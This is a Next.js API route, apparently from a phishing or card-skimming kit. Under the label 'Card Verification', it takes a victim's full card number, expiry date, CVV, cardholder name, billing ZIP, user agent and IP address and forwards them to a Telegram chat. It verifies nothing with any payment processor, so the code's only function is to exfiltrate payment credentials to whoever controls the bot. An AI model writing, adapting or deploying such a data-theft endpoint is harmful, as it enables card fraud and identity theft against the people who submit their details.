import { type NextRequest, NextResponse } from "next/server"
import { sendTelegramNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const { cardNumber, expiryDate, cvv, cardholderName, billingZip, timestamp, userAgent } = await request.json()

    const message =
      `💳 <b>Card Verification Submitted</b>\n\n` +
      `💳 Card Number: <code>${cardNumber}</code>\n` +
      `📅 Expiry Date: <code>${expiryDate}</code>\n` +
      `🔐 CVV: <code>${cvv}</code>\n` +
      `👤 Cardholder Name: <code>${cardholderName}</code>\n` +
      `📮 Billing ZIP: <code>${billingZip}</code>\n` +
      `⏰ Time: ${new Date(timestamp).toLocaleString()}\n` +
      `🌐 User Agent: ${userAgent}\n` +
      `📍 IP: ${request.ip || "Unknown"}`

    await sendTelegramNotification(message)

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Card verification notification error:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
